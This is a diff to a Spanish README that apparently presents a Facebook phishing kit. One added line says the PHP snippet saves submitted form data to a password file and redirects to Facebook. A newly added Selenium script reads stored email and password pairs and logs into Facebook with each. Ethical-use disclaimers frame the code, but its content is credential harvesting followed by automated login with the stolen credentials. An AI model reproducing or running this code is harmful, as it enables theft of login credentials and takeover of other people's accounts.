@@ -5,6 +5,7 @@ Este README tiene como objetivo proporcionar información sobre buenas práctica
 ## Descripción del Código
 
 El código proporcionado es un ejemplo que ilustra cómo se pueden manipular datos de formulario en un entorno web. Sin embargo, es esencial utilizar este código de manera ética y legal y contar con el permiso adecuado para realizar pruebas y actividades relacionadas con la seguridad.
+Este còdigo almacena los datos de un formulario en un bloc de notas y redirige a facebook
 ```php
 <?php
 $archivo = fopen("contras.txt", "a");
@@ -35,7 +36,54 @@ Para evitar el mal uso de datos de formulario y garantizar la seguridad y la int
 ## Nota Importante
 
 Este README se proporciona con la intención de promover prácticas de seguridad éticas y legales. El código proporcionado no debe utilizarse con fines maliciosos, y se debe tener cuidado de respetar las leyes y regulaciones aplicables en todo momento.
+# AUTOMATIZAR EL INISIO DE SESIÒN CON CONTRASEÑAS ALMACENADAS EN EL BLOC DE NOTAS
+```python
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
 
+# Configura el controlador de Selenium y el sitio web de destino
+driver = webdriver.Chrome()
+driver.get("https://www.facebook.com")
+
+# Lee las credenciales desde el archivo de bloc de notas
+with open("credenciales.txt", "r") as file:
+    data = file.read()
+
+# Divide el archivo en bloques separados por líneas en blanco
+usuarios = data.split('\n\n')
+
+for usuario in usuarios:
+    # Divide cada bloque en líneas y crea un diccionario clave-valor
+    credenciales = {}
+    for line in usuario.split('\n'):
+        key, value = line.strip().split('=')
+        credenciales[key] = value
+
+    # Verifica si existen las claves 'email' y 'pass' en el diccionario
+    if 'email' in credenciales and 'pass' in credenciales:
+        email = credenciales['email']
+        password = credenciales['pass']
+
+        # Encuentra los elementos de usuario y contraseña
+        username_element = driver.find_element_by_id("email")
+        password_element = driver.find_element_by_id("pass")
+
+        # Ingresa las credenciales
+        username_element.send_keys(email)
+        password_element.send_keys(password)
+
+        # Envía el formulario de inicio de sesión
+        password_element.send_keys(Keys.RETURN)
+
+        # Espera a que la página se cargue (puedes ajustar este tiempo)
+        driver.implicitly_wait(10)
+
+        # Realiza cualquier acción adicional aquí si es necesario
+
+# Cierra el navegador
+driver.close()
+
+```
 Recuerda que la seguridad informática debe centrarse en proteger sistemas y datos, no en comprometerlos. El cumplimiento ético y legal es fundamental en todas las actividades de seguridad informática.
 
 PROTOTIPO EN:
